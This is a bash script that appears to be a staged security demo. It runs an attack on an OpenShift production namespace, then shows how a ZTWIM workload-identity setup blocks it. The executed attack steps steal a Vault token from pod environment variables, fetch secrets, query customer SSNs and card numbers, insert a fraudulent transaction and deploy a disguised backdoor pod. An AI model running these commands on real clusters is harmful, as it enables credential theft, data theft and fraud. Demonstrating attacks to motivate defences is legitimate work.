#!/bin/bash
# Interactive Attack Demo - Pure Terminal Session
# Blank prompt -> press Enter -> command types out -> executes

set -e

type_command() {
    local cmd="$1"
    local delay="0.05"  # Delay between characters (adjustable)

    for (( i=0; i<${#cmd}; i++ )); do
        echo -n "${cmd:$i:1}"
        sleep $delay
    done
    echo ""
}

run_cmd() {
    local cmd="$1"
    echo -n "[ATTACKER] \$ "
    read -s
    type_command "$cmd"
    eval "$cmd"
    echo ""
}

clear

cat << 'EOF'
================================================================================
          PRODUCTION DATABASE BREACH - Live OpenShift Cluster
================================================================================

EOF

read -s

run_cmd "oc get pods -n production"

run_cmd "oc get deployment payment-processor -n production"

POD=$(oc get pod -n production -l app=payment-processor -o jsonpath='{.items[0].metadata.name}')

run_cmd "export POD=$POD"

run_cmd "echo \"Target pod: \$POD\""

run_cmd "oc exec -n production \$POD -- printenv | grep -i vault"

run_cmd "oc exec -n production \$POD -- sh -c 'curl -sf -H \"X-Vault-Token: \$VAULT_TOKEN\" \$VAULT_ADDR/v1/secret/data/database/production | jq .data.data'"

run_cmd "oc exec -n production \$POD -- sh -c 'curl -sf -H \"X-Vault-Token: \$VAULT_TOKEN\" \$VAULT_ADDR/v1/secret/data/api-keys/production | jq .data.data'"

run_cmd "oc exec -n production \$POD -- sh -c 'PGPASSWORD=SuperSecret123! psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c \"\\dt\"'"

run_cmd "oc exec -n production \$POD -- sh -c 'PGPASSWORD=SuperSecret123! psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c \"SELECT COUNT(*) as total_customers FROM customers;\"'"

run_cmd "oc exec -n production \$POD -- sh -c 'PGPASSWORD=SuperSecret123! psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c \"SELECT customer_name, email, account_balance, credit_card, ssn FROM customers ORDER BY account_balance DESC LIMIT 5;\"'"

run_cmd "oc exec -n production \$POD -- sh -c 'PGPASSWORD=SuperSecret123! psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -t -c \"SELECT SUM(account_balance) as total_at_risk FROM customers;\"' | xargs echo 'Total at risk: \$'"

run_cmd "oc exec -n production \$POD -- sh -c 'PGPASSWORD=SuperSecret123! psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c \"INSERT INTO transactions (customer_id, amount, transaction_type, description) VALUES (1, -50000.00, '\"'\"'withdrawal'\"'\"', '\"'\"'UNAUTHORIZED - Attacker controlled transfer'\"'\"');\"'"

run_cmd "oc exec -n production \$POD -- sh -c 'PGPASSWORD=SuperSecret123! psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c \"SELECT * FROM transactions ORDER BY created_at DESC LIMIT 3;\"'"

VAULT_TOKEN=$(oc exec -n production $POD -- printenv VAULT_TOKEN)

cat <<EOFYAML > /tmp/backdoor.yaml
apiVersion: v1
kind: Pod
metadata:
  name: backdoor-exfil
  namespace: production
  labels:
    app: monitoring
spec:
  containers:
  - name: exfil
    image: registry.access.redhat.com/ubi9/ubi-minimal:latest
    command: ["/bin/bash", "-c"]
    args:
    - |
      echo "Backdoor active - continuous data exfiltration"
      while true; do
        echo "[\$(date)] Exfiltrating to attacker C2..."
        sleep 300
      done
    env:
    - name: STOLEN_VAULT_TOKEN
      value: "$VAULT_TOKEN"
    - name: DB_HOST
      value: customer-database.production.svc.cluster.local
EOFYAML

run_cmd "oc apply -f /tmp/backdoor.yaml"

run_cmd "oc get pod backdoor-exfil -n production"

echo ""
echo "================================================================================"
echo ""
echo "Attack complete:"
echo ""
echo "  - Vault token stolen (90-day validity)"
echo "  - Database credentials compromised"
echo "  - API keys stolen (Stripe, AWS, SendGrid)"
echo "  - Customer data exfiltrated (10 records, \$1.2M+)"
echo "  - Fraudulent transaction created (\$50,000)"
echo "  - Backdoor deployed for persistence"
echo ""
echo "================================================================================"
echo ""

echo ""
echo "================================================================================"
echo "                    NOW LET'S SEE ZTWIM PREVENTION"
echo "================================================================================"
echo ""

read -s

# Check if protected environment exists
if oc get namespace production-protected &>/dev/null; then
    # Get protected pod
    PROTECTED_POD=$(oc get pod -n production-protected -l app=payment-processor-protected -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")

    if [[ -n "$PROTECTED_POD" ]]; then
        run_cmd "export PROTECTED_POD=$PROTECTED_POD"
        run_cmd "echo \"Protected pod: \$PROTECTED_POD\""

        run_cmd "oc exec -n production-protected \$PROTECTED_POD -- printenv | grep -i vault || echo 'No static VAULT_TOKEN found'"

        run_cmd "oc exec -n production-protected \$PROTECTED_POD -- sh -c 'if [ -z \"\$VAULT_TOKEN\" ]; then echo \"No VAULT_TOKEN available\"; echo \"Cannot access Vault without dynamic credential\"; exit 1; fi' || echo 'Attack blocked: No credentials available'"

        echo ""
        read -s

        echo "================================================================================"
        echo "                         ZTWIM PROTECTION SUMMARY"
        echo "================================================================================"
        echo ""
        echo "VULNERABLE (Traditional):"
        echo "  ✗ Static token in environment variable (90-day TTL)"
        echo "  ✗ Token stolen via printenv"
        echo "  ✗ Token works from anywhere"
        echo "  ✗ Complete system breach"
        echo ""
        echo "PROTECTED (ZTWIM):"
        echo "  ✅ No static tokens in environment"
        echo "  ✅ Dynamic JWT-SVIDs (2-minute TTL)"
        echo "  ✅ Credentials delivered via Unix socket"
        echo "  ✅ Automatic rotation every 2 minutes"
        echo "  ✅ Workload identity tied to pod lifecycle"
        echo "  ✅ Even if stolen, expires in minutes"
        echo ""
        echo "┌─────────────────────┬──────────────────────┬──────────────────────┐"
        echo "│ Aspect              │ Vulnerable           │ ZTWIM-Protected      │"
        echo "├─────────────────────┼──────────────────────┼──────────────────────┤"
        echo "│ Credential Type     │ Static token         │ Dynamic JWT-SVID     │"
        echo "│ Token Lifetime      │ 90 days (2160 hours) │ 2 minutes (120 sec)  │"
        echo "│ Storage Location    │ Environment variable │ Unix domain socket   │"
        echo "│ Rotation            │ Manual               │ Automatic            │"
        echo "│ Exfiltration Risk   │ CRITICAL             │ MINIMAL              │"
        echo "│ Persistence         │ 90 days              │ 2 minutes            │"
        echo "└─────────────────────┴──────────────────────┴──────────────────────┘"
        echo ""
        echo "================================================================================"
        echo ""
    else
        echo ""
        echo "Protected environment not ready."
        echo "Run: ./setup-protected-ztwim-environment.sh"
        echo ""
    fi
else
    echo ""
    echo "ZTWIM-protected environment not set up."
    echo "Run: ./setup-protected-ztwim-environment.sh"
    echo ""
fi
